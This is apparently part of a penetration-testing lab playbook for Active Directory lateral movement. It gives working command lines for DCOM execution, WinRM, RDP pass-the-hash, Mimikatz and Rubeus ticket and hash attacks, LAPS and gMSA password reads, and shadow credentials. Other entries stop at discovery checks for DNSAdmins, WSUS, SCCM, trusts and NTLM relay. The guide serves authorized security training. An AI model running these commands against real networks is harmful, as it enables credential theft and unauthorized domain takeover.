Find: Execute through an authorized DCOM application object Use the target's RPC and administration evidence to investigate a specific supported COM application, rather than treating DCOM as a universal shell. ```powershell Test-NetConnection TARGET -Port 135 ``` > **Recognize:** A named application and route form a candidate; component availability and allowed activation/method remain separate. > **Validate next:** Check dynamic RPC, actual class/rights, authentication/tool support, method and verifiable output/effect. [Execute through an authorized DCOM application object](../notes/methods/lateral-movement.md#move-dcom).
Commands and use-case variants > **Need:** Identified authentication material, destination service reachability and a candidate authorized identity. RPC/dynamic-port route, allowed DCOM activation and application method, supported authentication and target component Current Windows token: ```powershell $Type = [type]::GetTypeFromProgID('MMC20.Application.1','TARGET_HOST') $Object = [Activator]::CreateInstance($Type) $Object.Document.ActiveView.ExecuteShellCommand( 'cmd.exe', $null, '/c hostname > C:\Windows\Temp\movement-proof.txt', '7' ) ``` Impacket with password or NT hash: ```bash impacket-dcomexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-dcomexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' ``` > Current Impacket `dcomexec` explicitly rejects Kerberos for its supported MMC/Shell DCOM objects because they do not accept the required HOST ticket. Use `wmiexec -k` when Kerberos command execution is required. DCOM class availability, RPC reachability and launch/access permissions vary. > **Verify:** Verify the actual destination effect and identity; COM object creation alone does not prove command execution. > **If it fails:** Component absence, activation rights, modern DCOM hardening or unsupported client Kerberos can block this route.
Find: Use WinRM, WinRS or PowerShell remoting Check observed WinRM listeners from the real source and relate the identity to the configured endpoint/session authorization. ```powershell Test-NetConnection TARGET -Port 5985 Test-NetConnection TARGET -Port 5986 ``` > **Recognize:** A reachable endpoint plus a known credential is a candidate, not proof the account may enter that remoting session. > **Validate next:** Verify accepted authentication, correct name/TLS context, endpoint rights and any second-hop requirements. [Use WinRM, WinRS or PowerShell remoting](../notes/methods/lateral-movement.md#move-winrm).
Commands and use-case variants > **Need:** Identified authentication material, destination service reachability and a candidate authorized identity. Reachable HTTP(S) listener, accepted authentication and endpoint/session configuration permissions; hash/ticket support depends on client/context ##### Evil-WinRM ```bash # Password; omit -p to prompt where supported evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' # NT hash evil-winrm -i TARGET_HOST -u USER -H NT_HASH # HTTPS listener evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' -S -P 5986 ``` Current Evil-WinRM ticket-file support: ```bash evil-winrm -i TARGET_FQDN -r DOMAIN -K USER.ccache --spn HTTP ``` > **Need:** reachable 5985/5986, an enabled WinRM/PowerShell endpoint and endpoint authorization. The identity is commonly an administrator or a member of the applicable remote-management group, but endpoint SDDL/policy is decisive. Kerberos requires the FQDN/SPN, realm/KDC configuration and a compatible ticket. ##### Native WinRS ```cmd winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname & whoami" ``` To avoid retaining a password on the command line, use the current authorized Windows credential context where possible: ```cmd winrs /r:TARGET_HOST "cmd /c hostname & whoami" ``` > WinRS uses WinRM. A non-administrator can require `/noprofile` depending on endpoint configuration. `/allowdelegate` affects onward credential use and is not a default fix for the double-hop problem. ##### PowerShell remoting ```powershell Test-WSMan TARGET_HOST $Credential = Get-Credential 'DOMAIN\USER' Invoke-Command -ComputerName TARGET_HOST -Credential $Credential -ScriptBlock { hostname whoami /all } $Session = New-PSSession -ComputerName TARGET_HOST -Credential $Credential Enter-PSSession -Session $Session ``` > A hostname normally supports Negotiate/Kerberos in a domain. An IP address requires explicit credentials and generally HTTPS or a tightly scoped TrustedHosts configuration. Do not weaken global TrustedHosts merely to hide DNS/SPN mistakes. > **Verify:** Verify hostname, whoami /all and the actual session configuration/rights. > **If it fails:** Authentication denial, endpoint denial, TLS/name mismatch and second-hop failure require different fixes.
Find: Obtain an authorized RDP interactive session Check the destination RDP endpoint and use actual group/logon-policy evidence for the candidate identity; determine whether password or Restricted Admin is intended. ```powershell Test-NetConnection TARGET -Port 3389 ``` > **Recognize:** RDP transport does not grant desktop access; Restricted Admin/hash use has additional requirements. > **Validate next:** Check NLA/TLS, identity qualification, logon authorization and the chosen authentication mode. [Obtain an authorized RDP interactive session](../notes/methods/lateral-movement.md#move-rdp).
Commands and use-case variants > **Need:** Identified authentication material, destination service reachability and a candidate authorized identity. Allowed account/session policy and compatible client/NLA/TLS; hash-based Restricted Admin has additional supported-policy/admin requirements Check the installed binary name: ```bash command -v xfreerdp3 || command -v xfreerdp ``` Password: ```bash xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard ``` Older packages may expose the same syntax through `xfreerdp`. NT hash: ```bash xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /pth:NT_HASH /cert:ignore /dynamic-resolution ``` > FreeRDP's `/pth` uses Restricted Admin mode. The target must support/permit that mode and the identity must be an administrator; ordinary Remote Desktop Users membership is not sufficient for Restricted Admin. Password-based RDP instead needs the Remote Desktop service, NLA compatibility and the effective “Allow log on through Remote Desktop Services” right without a deny override. Native client: ```cmd mstsc.exe /v:TARGET_HOST mstsc.exe /restrictedAdmin /v:TARGET_HOST ``` Ordinary RDP can place reusable user credentials in the destination's LSASS. Restricted Admin avoids sending those reusable credentials but prevents ordinary onward access as that user; treat the resulting session's network identity separately. > **Purpose:** use a validated identity with Remote Desktop logon rights to establish a Windows desktop and verify the resulting source position. ##### Baseline: prompt for the password ```bash xfreerdp3 /v:TARGET /u:USER /dynamic-resolution /cert:ignore ``` Some Kali releases expose `xfreerdp` instead of `xfreerdp3`; check `command -v xfreerdp3 xfreerdp` and the selected binary's `/help` output. > **Decisive output:** a usable desktop establishes a remote session. Open PowerShell or Command Prompt and verify `whoami`, `hostname` and `ipconfig` before treating commands as target-origin execution.
Variant — domain identity ```bash xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /dynamic-resolution /cert:ignore ``` Local and domain accounts with the same username are different identities. Make the intended context explicit when results differ.
Variant — authentication only ```bash xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /auth-only /cert:ignore ``` This tests authentication without opening the UI. Success does not guarantee that all session policies or desktop initialization will permit a full session.
Variant — explicit password ```bash xfreerdp3 /v:TARGET /u:USER '/p:PASSWORD' /dynamic-resolution /cert:ignore ``` Prefer prompting because command-line passwords can enter shell history and process listings.
> **Failure cues:** a certificate warning is not a credential result. NLA/security negotiation, account context, authentication, Remote Desktop logon rights and an already occupied/restricted session can fail separately. `/cert:ignore` is appropriate only for the controlled lab context because it removes certificate identity validation. > **Next:** after verifying the host and identity, enumerate groups/privileges, files, local services/listeners and routes from the new source position. > **Verify:** Verify destination, user/token and permitted desktop actions; keep credentials out of reusable screenshots/notes. > **If it fails:** A valid password can still lack logon rights. NLA, TLS, domain qualification and Restricted Admin policy are separate conditions.
Find: Select password, NT hash, key-to-ticket or ticket authentication Return to the credential source and inspect format, identity and ticket service scope before selecting a remote protocol. ```bash klist getent hosts TARGET_HOST date -u ``` > **Recognize:** The cache permits investigating a matching CIFS action, not arbitrary WinRM or a new TGS without a TGT/KDC route. > **Validate next:** Match NTLM versus Kerberos support, account/domain, key/encryption policy, name/time and destination rights. [Select password, NT hash, key-to-ticket or ticket authentication](../notes/methods/lateral-movement.md#move-auth-material).
Commands and use-case variants > **Need:** Identified authentication material, destination service reachability and a candidate authorized identity. Credential type accepted by the chosen protocol/client, correct identity/domain, naming/time and destination authorization ##### Pass-the-Hash ```text NT HASH -> NTLM CHALLENGE/RESPONSE -> TARGET SERVICE ``` PtH requires an NTLM-capable service, a valid account context and the service-specific right. SMB share access may work without administrative execution; PsExec/WMIExec/SMBExec usually need administrative rights. Remote UAC commonly filters non-built-in local administrators. Domain accounts in the target Administrators group traditionally receive a full remote token, but newer Administrator Protection policy can change that result—trust the observed target token and method-specific authorization. ##### Overpass-the-Hash / key-to-ticket Mimikatz network-credential context: ```text sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:powershell.exe ``` Rubeus TGT request: ```cmd Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt klist ``` AES alternative: ```cmd Rubeus.exe asktgt /user:USER /domain:DOMAIN /aes256:AES256_KEY /dc:DC_HOST /ptt ``` Trigger a Kerberos service request with the hostname, then inspect: ```cmd dir \\TARGET_HOST\C$ klist ``` > In a Mimikatz `sekurlsa::pth` process, `whoami` can still show the original local process token while network authentication uses the supplied identity. Validate the ticket's client and the remote result rather than treating local `whoami` as the network identity. ##### Pass-the-Ticket Windows: ```cmd Rubeus.exe ptt /ticket:ticket.kirbi klist ``` ```text kerberos::ptt ticket.kirbi ``` Linux: ```bash export KRB5CCNAME="$PWD/ticket.ccache" klist impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' ``` A TGS must name the selected service/hostname. A TGT can request a suitable TGS only while valid and when the KDC is reachable. Ticket import is not lateral movement until the destination accepts it and produces the intended authorized effect. > **Verify:** Verify exact material type, represented network identity and successful destination action. > **If it fails:** Wrong ticket service, RC4 policy, time skew, IP-only SPN naming or local/domain mismatch can invalidate one variant while another remains viable.
### Additional conditional surfaces Open a branch only when its observation and prerequisites match. Discovery-only entries retain their missing-action boundary.
Read a classic LAPS password for one computer - **Enter:** a specific computer object is relevant and the current directory principal may read `ms-Mcs-AdmPwd`. - **Discover:** identify the computer object and test the attribute read; merely enumerating the object is not enough. - **Validate:** the returned value is present, current and scoped to that computer's managed local account; identify the intended local username and destination service separately. - **Execute:** [Delegated LAPS/gMSA reads](../reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md#delegated-reads--laps-and-gmsa-material). - **Verify:** validate the password on one compatible service using explicit local-account context, then prove the specific permitted operation. Password acceptance does not prove local administration or remote execution. - **Outcomes:** readable current value → [credential classification](../notes/methods/credentials.md#credential-classify)/[remote operation preflight](../notes/methods/lateral-movement.md#move-preflight); attribute denied/absent for this principal/object → ruled out here; schema, replication freshness or object identity unresolved → inconclusive.
Documented commands and conditions Use when directory permissions grant access to the secret-bearing attribute. Being able to enumerate the computer or service account does not grant that read. ```bash # Classic LAPS: password for the relevant computer's local administrator bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \ get object 'COMPUTER$' --attr ms-Mcs-AdmPwd # Windows LAPS: returned content/format depends on schema and protection bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \ get object 'COMPUTER$' --attr msLAPS-Password # gMSA: inspect the allowed managed-password attribute bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \ get object 'GMSA$' --attr msDS-ManagedPassword ``` Read: a LAPS value is scoped to the named host's local account. An encrypted Windows-LAPS value still needs the permitted decryption context. A gMSA blob/base64 string is not automatically a directly reusable NT hash: parse/decode it with a compatible gMSA tool before choosing authentication. Missing/denied attributes → distinguish schema, permissions and an empty value. Sources: [upstream 1](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide) · [upstream 2](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview).
[Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S02).
Read or decrypt a Windows LAPS password - **Enter:** a relevant computer uses Windows LAPS and the principal may read `msLAPS-Password` or decrypt the protected value. - **Discover:** query the exact computer attribute and record whether the result is plaintext JSON, encrypted content, empty or denied. - **Validate:** plaintext/decryption rights, password age, managed account name and host scope. An encrypted blob without the permitted decryption context is not a password. - **Execute:** [Delegated LAPS/gMSA reads](../reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md#delegated-reads--laps-and-gmsa-material). - **Verify:** validate only against the named host and intended local account, then establish the actual service capability. - **Outcomes:** usable current password → [credential classification](../notes/methods/credentials.md#credential-classify)/[remote operation preflight](../notes/methods/lateral-movement.md#move-preflight); no read/decrypt right → ruled out here; returned protected data but decryption context unknown → inconclusive. [Shared commands and variants](#surface-S02). [Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S03).
Recover and classify gMSA material - **Enter:** a specific gMSA is used by a relevant service and the current identity may read `msDS-ManagedPassword`. - **Discover:** inspect the gMSA object and allowed managed-password readers; distinguish a raw blob from a decoded NT hash. - **Validate:** exact account name including `$`, managed-password read permission, working LDAPS/tool path, decoded representation and intended service/host. - **Execute:** [Raw and decoded gMSA checks](../reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md#gmsa--obtain-a-decoded-hash-only-with-managed-password-read-rights). - **Verify:** test one service compatible with the decoded material and record the exact accepted identity and operation. Authentication is not administrative execution. - **Outcomes:** decoded material accepted for the intended identity → [credential classification](../notes/methods/credentials.md#credential-classify)/[remote operation preflight](../notes/methods/lateral-movement.md#move-preflight); read denied or wrong object type → ruled out here; raw blob, TLS failure or empty output → inconclusive.
Documented commands and conditions Use when the accepted directory identity has the managed-password read permission for the gMSA. NetExec selects LDAPS for this operation, so the DC's LDAP TLS path must work. ```bash nxc ldap DC_IP -d DOMAIN -u USER -p 'PASSWORD' --gmsa # After identifying the returned service account and hash, test one relevant service nxc smb TARGET -d DOMAIN -u 'GMSA$' -H HASH --shares ``` Read: keep the exact service-account name and decoded NT hash together; an encoded `msDS-ManagedPassword` blob is a different representation. Authentication acceptance still does not prove administrative/remote-execution rights. Empty output → inspect object permissions, LDAPS, account type and collection errors before concluding that no gMSA path exists. Sources: [upstream 1](https://www.netexec.wiki/ldap-protocol/dump-gmsa).
[Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S04).
Use a validated shadow-credential path - **Enter:** the effective principal can write the target object's `msDS-KeyCredentialLink`, and the assigned lab permits the object change. - **Discover:** list existing key credentials before mutation and preserve their identifiers. - **Validate:** target identity, exact effective write right, DC PKINIT/key-trust support, DNS/time/KDC route, certificate tooling and a cleanup route. - **Execute:** [Shadow credentials — add, authenticate and remove only the added DeviceID](../reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md#shadow-credentials--object-key-write-pkinit-then-cleanup). - **Verify:** establish the cached target principal and one intended service action; then confirm that only the newly added key credential was removed. - **Outcomes:** target TGT/service capability established → [ticket and key context](../notes/methods/credentials.md#ticket-use)/[remote operation preflight](../notes/methods/lateral-movement.md#move-preflight); effective write or PKINIT prerequisite disproved → ruled out here; write succeeds but certificate/KDC mapping is unresolved → [failed-boundary diagnosis](../notes/methods/execution.md#execution-format)/inconclusive.
Documented commands and conditions Use only with effective write access to the target's `msDS-KeyCredentialLink`, a DC supporting the required key-trust/PKINIT behavior, correct time/DNS and compatible certificates. Inspect existing values first. ```bash python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \ --target TARGET_USER --action list # Adds a new key credential and generates certificate material; record its DeviceID python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \ --target TARGET_USER --action add --filename target-key # Use the generated PFX password; request the target principal's TGT python3 gettgtpkinit.py -cert-pfx target-key.pfx -pfx-pass 'PFX_PASSWORD' \ -dc-ip DC_IP DOMAIN/TARGET_USER target.ccache export KRB5CCNAME="$PWD/target.ccache" klist # Optional NT-hash recovery from this PKINIT TGT; key is the printed AS-REP key python3 getnthash.py -key AS_REP_KEY -dc-ip DC_IP DOMAIN/TARGET_USER # Remove only the key credential you added; never clear unrelated original values python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \ --target TARGET_USER --action remove --device-id DEVICE_ID ``` Read: a successful attribute write does not yet establish a TGT or service authorization. Verify the cached principal and the intended service. PKINIT/certificate failure → inspect KDC support, mapping and trust; do not keep overwriting keys. Preserve the original state and remove only your added DeviceID after the test. Sources: [upstream 1](https://github.com/ShutdownRepo/pywhisker) · [upstream 2](https://github.com/dirkjanm/PKINITtools).
[Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S05).
Authenticate to LDAP with a mapped certificate - **Enter:** you possess a certificate and private key plausibly mapped to an AD identity, and LDAP over TLS is reachable. - **Discover:** identify certificate subject/SAN/EKU, trust chain, private-key availability and the DC TLS path. - **Validate:** the certificate maps to the intended principal, the private key matches, Schannel authentication is accepted and the mapped identity has the exact object right required by the intended LDAP operation. - **Execute:** [PassTheCert identity check and LDAP shell](../reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md#passthecert--schannelldap-when-the-certificate-is-usable-there). - **Verify:** `whoami`/bind establishes only the mapped LDAP identity; separately verify the selected LDAP read or write and its object state. - **Outcomes:** mapped identity and permitted object operation confirmed → [directory-right validation](../notes/methods/ad-mapping.md#domain-acl); mapping/trust/private key disproved → ruled out here; PKINIT fails while Schannel remains untested, or TLS errors mask mapping → inconclusive.
Documented commands and conditions Use a certificate/private key mapped to an accepted AD identity with the necessary trust/EKU and a working LDAP TLS path. PKINIT and Schannel are different authentication paths: failure of one does not prove the other works or fails. ```bash # Extract PEM material from the relevant PFX; respond to password prompts openssl pkcs12 -in USER.pfx -clcerts -nokeys -out USER.crt openssl pkcs12 -in USER.pfx -nocerts -nodes -out USER.key # First identify the principal accepted through the certificate python3 passthecert.py -action whoami -crt USER.crt -key USER.key \ -domain DOMAIN -dc-host DC_HOST -dc-ip DC_IP # Inspect operations in the LDAP shell before choosing an authorized write python3 passthecert.py -action ldap-shell -crt USER.crt -key USER.key \ -domain DOMAIN -dc-host DC_HOST -dc-ip DC_IP ``` Read: successful binding proves that mapped identity's LDAP context, not domain administration. The same object ACL still governs group/password/delegation writes. Certificate trust/mapping, TLS policy or a missing private key can block this route. Do not weaken workstation-wide TLS settings to compensate for an unexplained failure. Sources: [upstream 1](https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/README.md).
[Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S06).
Create a controlled machine account only for a selected AD path - **Enter:** a validated RBCD/delegation path needs a service principal or machine key you control. - **Discover:** inspect machine-account quota, target OU/container ACL, existing names and whether the current identity can create the account in the intended location. - **Validate:** the downstream path actually needs this principal, the resulting SPNs/key will be usable, target-object rights are independently present, and cleanup/deletion rights are understood. - **Execute:** [Powermad machine-account creation](../reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md#powermad--create-an-account-only-when-the-chosen-ad-path-needs-it). - **Verify:** confirm the created object, its SPNs and controlled key; do not record RBCD or target access until the separate delegation operation and service ticket succeed. - **Outcomes:** controlled principal created for an already validated receiver path → [conditional AD paths](../notes/methods/ad-identities.md#ad-delegation); quota/ACL/name condition fails → ruled out here; object exists but downstream target right is missing → retain only the machine-account capability.
Documented commands and conditions Use from a suitable authenticated PowerShell context when the actual quota/delegation permits computer creation and the planned path needs an account/SPN you control. Account creation alone does not grant RBCD rights on another host. ```powershell Import-Module .\Powermad.ps1 $machinePassword = ConvertTo-SecureString 'MACHINE_PASSWORD' -AsPlainText -Force New-MachineAccount -MachineAccount NEWPC -Password $machinePassword ` -Domain DOMAIN -DomainController DC_HOST ``` Read: verify the created account, its SPNs and the chosen target-object permission separately. Quota, OU ACLs and existing names can stop the operation. Standard create rights do not necessarily permit deleting the created account later; establish the cleanup route and avoid repeated throwaway account creation. Sources: [upstream 1](https://github.com/Kevin-Robertson/Powermad).
[Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S07).
Evaluate DNSAdmins without assuming immediate execution - **Enter:** the controlled principal is a direct/effective DNSAdmins member or has equivalent DNS-server configuration rights. - **Discover:** identify the actual DNS server, DNS service state/identity and service ACL from the current authorized source. - **Validate:** effective configuration permission, product/build behavior, a usable plugin/configuration operation, payload delivery path and a separately authorized restart trigger. A restart on a DC is disruptive and is never a discovery probe. - **Execute:** [DNSAdmins condition checks](../reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts.md#dnsadmins-distinguish-dns-configuration-from-a-service-trigger). - **Verify:** current content supports only membership/service/trigger investigation. A complete plugin execution and cleanup procedure is not registered; see the pending action procedure. - **Outcomes:** all prerequisites identified → ready for a separately reviewed procedure; membership absent/effective right denied → ruled out here; group present but configuration or trigger unknown → inconclusive. > **Boundary:** discovery/validation only; the action procedure is pending.
Documented commands and conditions ```powershell # Domain-joined source with the RSAT AD module and readable group membership Get-ADGroupMember -Identity DnsAdmins -Recursive ``` ```cmd :: Service queries use the current identity and can be denied separately sc.exe \\DC_HOST qc DNS sc.exe \\DC_HOST sdshow DNS ``` > **Read → next:** resolve whether the controlled identity really has DNS-server configuration rights, which server runs DNS, its service identity, and whether a usable plugin/configuration operation and restart trigger exist on that build. Group membership alone does not prove immediate execution or restart rights. Follow the [service-control permission workflow](../reference/05-local-privilege-escalation/02-windows-privilege-escalation.md#4-service-control-and-executed-objects). A DNS restart on a DC can interrupt the domain; do not use it as a discovery probe.
[Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S08).
Map WSUS client policy to a server-side authorization question - **Enter:** host policy or traffic indicates the machine uses WSUS. - **Discover:** read `WUServer`, `WUStatusServer` and `UseWUServer`; record URL, port, TLS and actual source reachability. - **Validate:** authenticated access to the identified server, update-approval/content/signing/deployment rights, target group scope and the privileged client consumer. Client configuration alone supplies none of those rights. - **Execute:** [WSUS client authority discovery](../reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts.md#wsus-identify-the-update-authority-from-the-current-client). - **Verify:** this state produces a named update authority and a missing-rights checklist, not code execution. A complete update-deployment procedure is not registered; see the pending action procedure. - **Outcomes:** authority plus exact server-side control established → ready for a separately reviewed procedure; server rights denied → ruled out here; registry values absent or server role unknown → inconclusive. > **Boundary:** discovery/validation only; the action procedure is pending.
Documented commands and conditions ```cmd reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate /v WUServer reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate /v WUStatusServer reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer ``` > **Read → next:** record the actual server URL, port, TLS and client policy. A client configured for WSUS does not grant update approval, content/signing control or server administration. Investigate server access and the exact privileged update consumer only after those rights are established. Missing registry values can mean another policy/configuration source; they do not prove the organization has no WSUS.
[Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S09).
Recognize SCCM client context and locate the management boundary - **Enter:** `CcmExec`, `SMS_Client` or readable client configuration indicates Configuration Manager. - **Discover:** identify client state, assigned site, management point and reachable authenticated interfaces. - **Validate:** SMS Provider/site-server authorization, deployment or CMPivot rights, relevant collection scope and any specifically readable credential source. Client presence does not imply server rights. - **Execute:** [SCCM client recognition checks](../reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts.md#configuration-manager--sccm-recognize-the-client-before-choosing-a-server-side-path). - **Verify:** this state establishes product/site context only. A complete SCCM rights-to-action procedure is not registered; see the pending action procedure. - **Outcomes:** exact management interface and relevant permission found → ready for a separately reviewed procedure; no applicable server permission → ruled out here; namespace access denied or site/role unresolved → inconclusive. > **Boundary:** discovery/validation only; the action procedure is pending.
Documented commands and conditions ```powershell Get-Service CcmExec -ErrorAction SilentlyContinue Get-CimInstance -Namespace root\ccm -ClassName SMS_Client ``` > **Read → next:** `CcmExec`/`SMS_Client` identifies a client context. It does not prove site-server access, SMS Provider authorization, deployment rights, accessible network-access-account credentials or permission to execute CMPivot. Record the site/management point from readable client configuration and test only the matching authenticated interface. Namespace absent and access denied are different outcomes. This reference does not yet contain a complete SCCM compromise procedure.
[Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S10).
Interpret an AD trust as a boundary, not a privilege transition - **Enter:** directory or native trust enumeration identifies another domain/forest relationship. - **Discover:** record source and destination domain, direction, trust type/transitivity, same-forest versus cross-forest context, selective authentication and SID filtering. - **Validate:** destination DNS/KDC/service reachability, accepted identity, target SPN, allowed-to-authenticate/resource rights and the exact capability sought. A trust object or child-domain administration is not automatically forest compromise. - **Execute:** [Trust-boundary inspection](../reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts.md#trusts-inspect-the-boundary-before-treating-another-domain-as-reachable-privilege), then [movement preflight](../reference/06-ad-lateral-movement/05-lateral-movement.md#2-preflight-from-the-actual-source). - **Verify:** establish one destination service action under the named identity. Trust-key/SID-history forgery and coercion chains are not registered complete procedures; see the pending action procedure. - **Outcomes:** destination service accepts the identity and action → [remote operation preflight](../notes/methods/lateral-movement.md#move-preflight); filtering/selective-auth/resource authorization decisively denies it → ruled out here; direction/filtering/identity or route unresolved → inconclusive. > **Boundary:** discovery/validation only; the action procedure is pending.
Documented commands and conditions ```cmd nltest /domain_trusts /all_trusts ``` ```powershell # RSAT alternative; query the domain in the current authenticated context Get-ADTrust -Filter * -Properties * | Format-List Name,Direction,TrustType,ForestTransitive,SelectiveAuthentication,SIDFilteringForestAware,SIDFilteringQuarantined ``` > **Read → next:** keep trust direction, same-forest versus cross-forest scope, SID filtering, selective authentication, target SPN and the accepted identity separate. A trust object or child-domain admin does not by itself prove a usable forest-compromise chain. Verify name resolution, service reachability and authorization in the destination using the [movement preflight](../reference/06-ad-lateral-movement/05-lateral-movement.md#2-preflight-from-the-actual-source). Trust-key/SID-history forgery and cross-forest coercion are specialized paths, not complete procedures in this playbook.
[Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S11).
Inspect VSS/shadow-copy credential-source conditions - **Enter:** you control a Windows Server/DC context where offline credential material is relevant and the token may hold administrative or backup rights. - **Discover:** inspect `whoami /priv`, `vssadmin list shadows`, then `diskshadow` → `list shadows all`. - **Validate:** establish platform, exact volume, existing-versus-new snapshot, read rights, matched `NTDS.dit` and SYSTEM-hive requirement, output destination and cleanup authority. - **Execute:** [shadow-copy boundary checks](../reference/06-ad-lateral-movement/02-credential-access.md#shadow-copy-boundary-inspect-before-creating-anything). Creating/exposing/deleting a shadow and acquiring the matched files remain unavailable until the pending action procedure is complete. - **Verify:** listing proves only snapshot metadata. Credential acquisition requires readable, point-in-time-compatible NTDS/SYSTEM material and successful offline parsing. - **Outcomes:** suitable existing snapshot and read path identified → ready for the pending action procedure procedure; platform/rights/volume/source decisively incompatible → ruled out here; snapshot listed but access/freshness/matching hive unresolved → inconclusive. - **Source:** [Microsoft DiskShadow](https://learn.microsoft.com/windows-server/administration/windows-commands/diskshadow). > **Boundary:** discovery/validation only; the action procedure is pending.
Documented commands and conditions From an already controlled Windows Server/DC context, first determine whether a usable snapshot already exists and whether the current token has the required backup/administrative rights: ```cmd whoami /priv vssadmin list shadows diskshadow ``` At the `DISKSHADOW>` prompt: ```text list shadows all exit ``` > **Interpret:** an existing shadow proves only a snapshot object. It does not prove the current identity can read `NTDS.dit`, that the copy is current, or that a matching SYSTEM hive has been acquired. `DiskShadow` is a Windows Server utility; absence on a workstation is a platform result, not proof that VSS does not exist. Creating, exposing or deleting a shadow changes host state and normally requires elevated backup/administrator context. Do not offer those actions until the selected procedure records the exact volume, matched NTDS/SYSTEM acquisition, destination, verification and cleanup. The state-machine gap is tracked as `RW08`; listing is safe discovery, not credential acquisition.
[Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S16).
Evaluate a direct Net-NTLMv2 relay path without spoofing - **Enter:** an explicitly authorized, live NTLM authentication source is already present and a different receiver target is relevant. A saved Net-NTLMv2 response alone does not enter this state. - **Discover:** identify source protocol/event, relayed principal, receiver protocol/host and source-to-target reachability. For a selected SMB receiver, inspect signing with `nmap -p 445 --script smb2-security-mode TARGET`. - **Validate:** receiver accepts NTLM, signing/EPA/channel binding/reflection protections permit the exchange, and the relayed principal has one useful target operation. Current exam rules prohibit poisoning/spoofing; Responder name-resolution poisoning is never the source in the exam workflow. - **Execute:** the existing [tool reference](../cheatsheets/tool-command-reference.md#responder-and-ntlm-relay) is not a complete action-specific procedure. Keep execution unavailable pending the pending action procedure. - **Verify:** define success as the chosen receiver operation under the relayed identity, not merely an inbound connection or captured challenge-response. - **Outcomes:** source + compatible receiver + useful authorization established → ready for the pending action procedure procedure; signing/protocol/authorization decisively blocks it → ruled out for that receiver; protection or source-event behavior unresolved → inconclusive. > **Boundary:** discovery/validation only; the action procedure is pending. [Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S17).
Inspect AD-integrated DNS record control - **Enter:** AD-integrated DNS is present and a selected zone or record object may be writable by the current principal. - **Discover:** enumerate the zone container and record objects from a domain Windows context: ```powershell $Root = (Get-ADRootDSE).defaultNamingContext $DnsBase = "CN=MicrosoftDNS,DC=DomainDnsZones,$Root" Get-ADObject -SearchBase $DnsBase -LDAPFilter '(objectClass=dnsNode)' -Properties dnsRecord -ResultSetSize 50 ``` - **Validate:** identify one exact `dnsNode` distinguished name, effective create/write-child or record-property right, zone replication scope, resolver path, intended record/value, TTL and cleanup/restore plan. Zone visibility is not write permission. - **Execute:** no record-add/modify/delete procedure is registered; keep mutation unavailable under the pending action procedure. - **Verify:** a future write must resolve through the intended client path and cleanup must restore only the changed record. LDAP success alone is insufficient. - **Outcomes:** exact writable object/zone and resolver path established → ready for the pending action procedure; effective right denied or non-AD-integrated zone → ruled out here; object visible but ACL/replication/client resolver unresolved → inconclusive. > **Boundary:** discovery/validation only; the action procedure is pending. [Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S18).
